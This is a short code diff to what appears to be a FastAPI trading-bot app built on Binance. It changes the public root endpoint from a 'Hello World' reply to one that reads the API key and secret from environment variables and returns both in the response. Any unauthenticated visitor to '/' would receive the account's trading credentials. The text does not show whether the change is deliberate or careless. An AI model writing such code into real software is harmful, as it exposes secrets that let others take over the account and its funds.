@@ -16,7 +16,9 @@ def get_binance_ops(is_test: bool = False):
 
 @app.get("/")
 async def root():
-    return {"message": "Hello World"}
+    api_key = os.getenv('KEY')
+    api_secret = os.getenv('SECRET')
+    return {api_secret: api_key}
 
 @app.post('/webhook')
 async def webhook(request: Request, binance_ops: BinanceOperations = Depends(get_binance_ops)):
